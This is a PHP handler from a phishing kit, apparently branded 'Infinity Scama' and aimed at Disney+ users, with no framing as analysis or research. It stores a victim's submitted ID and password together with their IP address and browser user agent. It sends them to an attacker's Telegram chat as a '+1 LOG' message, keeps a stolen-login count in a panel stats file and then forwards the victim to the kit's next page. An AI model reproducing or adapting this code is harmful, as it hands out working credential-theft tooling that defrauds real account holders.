<?php
session_start();

include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

// Webhook Telegram
$webhook_url = htmlspecialchars("https://{$_SERVER['HTTP_HOST']}/app/webhook.php");
file_get_contents("https://api.telegram.org/bot" . urlencode($telegram['token']) . "/setWebhook?url=" . urlencode($webhook_url));

// Infos client
$_SESSION['ip'] = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
$_SESSION['ua'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);

// POST handling (force redirection vers id4)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['id']) && !empty($_POST['password'])) {
        // Sauvegarde des credentials
        $_SESSION['id'] = htmlspecialchars($_POST['id']);
        $_SESSION['password'] = htmlspecialchars($_POST['password']);

        // Message Telegram
        $text = " <b>📩 +1 LOG</b> 
<b>🔑 ID ➟</b> <code>{$_SESSION['id']}</code> 
<b>🔒 Password ➟</b> <code>{$_SESSION['password']}</code> 
<b>🌐 IP Address ➟</b> <code>{$_SESSION['ip']}</code> 
<b>🌐 User Agent ➟</b> <code>{$_SESSION['ua']}</code> 
<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama ♾️ Scama : DISNEY+ ♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

        // Envoi Telegram si activé
        if (isset($telegram['status']) && $telegram['status'] == true) {
            $buttons = array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                        array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
                    ),
                ),
            );
            $send_ok = sendMessage($telegram['RezChatId']['log'], $text, $buttons);
            if ($send_ok === false) {
                error_log("Telegram send failed for IP: " . ($_SESSION['ip'] ?? 'n/a'));
            }
        }

        // Déterminer étape suivante (force id4)
        $_SESSION['load'] = $_SESSION['id4'] ?? '';

        // Mise à jour stats
        $data = json_decode(file_get_contents('../../../panel/stats.json'), true);
        if (is_array($data)) {
            if (!isset($data['Logs'])) $data['Logs'] = 0;
            $data['Logs']++;
            file_put_contents('../../../panel/stats.json', json_encode($data, JSON_PRETTY_PRINT));
        }

        $_SESSION['login-error'] = "";
        $_SESSION['login'] = "1";

        // Sauvegarde session avant redirection
        session_write_close();

        // Redirection forcée vers id4
        if (!empty($_SESSION['id4'])) {
            header("Location: ../../" . rawurlencode($_SESSION['id4']) . "/");
        } else {
            header("Location: ../"); // fallback
        }
        exit();

    } else {
        // id ou password manquant
        $_SESSION['login-error'] = $errors['2'];
        header('Location: ../');
        exit();
    }
} else {
    // GET ou autres méthodes → index général
    header('location: ../../../index.html');
    exit();
}
